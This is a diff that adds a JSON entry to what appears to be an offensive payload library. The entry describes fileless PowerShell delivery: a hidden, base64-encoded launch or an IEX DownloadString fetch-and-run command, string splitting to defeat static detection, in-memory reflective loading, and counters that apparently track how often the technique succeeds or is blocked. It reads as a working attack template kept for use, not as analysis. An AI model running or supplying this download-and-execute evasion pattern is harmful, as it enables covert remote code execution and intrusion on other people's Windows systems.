@@ -1,0 +1,35 @@
+{
+  "id": "w013",
+  "name": "脚本投递（PowerShell 内存执行）",
+  "family": "payload/script",
+  "cve": [],
+  "match": {
+    "os": "windows",
+    "vector": "execution"
+  },
+  "variants": [
+    {
+      "vid": "v1",
+      "desc": "下载执行 + 字符串拆分绕过静态 + 内存反射加载，磁盘零落地",
+      "command": "powershell -w hidden -enc <base64> 或 IEX(New-Object Net.WebClient).DownloadString(...)",
+      "sig": [
+        "DownloadString",
+        "IEX",
+        "hidden"
+      ],
+      "stack": [
+        "obf.string-enc",
+        "fileless.registry"
+      ],
+      "platform": "windows",
+      "stats": {"tries": 0, "ok": 0, "blocked": 0, "fail": 0},
+      "streak_fail": 0,
+      "confidence": 0.5
+    }
+  ],
+  "evasion": {},
+  "attempts": [],
+  "derived": [],
+  "created_at": "2026-11-15T00:00:00Z",
+  "updated_at": "2026-11-15T00:00:00Z"
+}
